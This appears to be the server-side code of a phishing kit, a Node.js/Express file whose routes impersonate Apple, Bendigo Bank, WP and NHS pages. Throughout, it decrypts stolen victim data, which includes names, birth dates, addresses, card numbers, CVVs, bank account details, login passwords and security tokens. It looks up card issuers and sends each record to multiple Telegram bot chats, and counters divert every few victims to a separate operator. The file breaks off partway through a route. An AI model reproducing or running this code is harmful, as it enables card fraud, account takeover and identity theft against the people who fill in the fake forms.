app.post("/onlymyApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (TheOnlyMY == 100) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        TheOnlyMY = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleOnlyMy:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=418410122&text=Apple:\n${originalText}`
        );
        TheOnlyMY += 1;
      }
    });
});

let nchroCount = 0;

app.options("/nchroApple", cors());

app.post("/nchroApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (nchroCount == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        nchroCount = 4;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleNchro:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=956029722&text=Apple:\n${originalText}`
        );
        nchroCount += 1;
      }
    });
});

app.options("/trizApple", cors());

app.post("/trizApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleTriz:\n${originalText}`
      );
      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1190384225&text=AppleTriz:\n${originalText}`
      );
      res.send("Update Complete");
    });
});

app.options("/chasedabag24s", cors());

app.post("/chasedabag24s", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nTown: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (cdbCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        cdbCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCDB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=911916233&text=Apple:\n${originalText}`
        );
        cdbCount += 1;
      }

      res.send("Update Completed");
    });
});

let clearstore = 0;

app.options("/baliApple", cors());

app.post("/baliApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios.post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-673884200&text=Apple:\n${originalText}`
      );
    });
});

//WP
//WP
//WP

let wpCount = 0;

app.options("/wpSaveLogin", cors());

app.post("/wpSaveLogin", (req, res) => {
  customerId = req.body.customerId;
  password = req.body.password;
  telephone = req.body.telephone;
  owner = req.body.owner;

  var originalText = `+----------- Login Information ------------+\nCustomer ID: ${customerId}\nPassword: ${password}\nPhone Number: ${telephone}`;
  if (wpCount == 3) {
    axios.post(
      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
    );
    wpCount = 0;
  } else {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=WPLoginSpooferGoofer:\n${originalText}`
    );
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=WPLogin:\n${originalText}`
    );
    wpCount += 1;
  }
  res.send("Update Completed");
});

//BENDIGO
//BENDIGO
//BENDIGO

let skiiBendigo = 0;

app.options("/bendigoLogin", cors());

app.post("/bendigoLogin", (req, res) => {
  accessId = CryptoJS.AES.decrypt(req.body.accessId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  owner = req.body.owner;

  var originalText = `+----------- Login Information ------------+\nAccess ID: ${accessId}\nPassword: ${password}`;
  if (skiiBendigo == 3) {
    axios.post(
      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
    );
    skiiBendigo = 0;
  } else {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=BendigoLogin:\n${originalText}`
    );
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=BendigoLogin:\n${originalText}`
    );
    skiiBendigo += 1;
  }
  res.send("Update Completed");
});

app.options("/bendigoSkii", cors());

app.post("/bendigoSkii", (req, res) => {
  accessId = CryptoJS.AES.decrypt(req.body.accessId, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  secToken = CryptoJS.AES.decrypt(req.body.secToken, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  var originalText = `+----------- Login Information ------------+\nAccess ID: ${accessId}\nPassword: ${password}\nSecurity Token: ${secToken}\n+ ----------- Personal Information ------------+\nPhone Number: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
  if (skiiBendigo == 3) {
    axios.post(
      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
    );
    skiiBendigo = 0;
  } else {
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=BendigoSkii:\n${originalText}`
    );
    axios.post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1437456088&text=Bendigo:\n${originalText}`
    );
    skiiBendigo += 1;
  }

  res.send("Update Completed");
});

//NHS
//NHS
//NHS

app.options("/sendKelvFriendResTwo", cors());

app.post("/sendKelvFriendResTwo", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1715235543&text=NHS2:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1341611061&text=NHS2:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=NHS2:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/@kworthy1", cors());

app.post("/@kworthy1", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSKev:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248378980&text=NHS3:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1715235543&text=NHS3:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/stillrunning", cors());

app.post("/stillrunning", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kelvCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        kelvCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSStillRunning:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1065375205&text=NHS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1368320362&text=NHS:\n${originalText}`
        );
        kelvCount += 1;
      }

      res.send("Update Completed");
    });
});

let Spoofergoofer = 4;

app.options("/spoofergooferNHS", cors());

app.post("/spoofergooferNHS", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
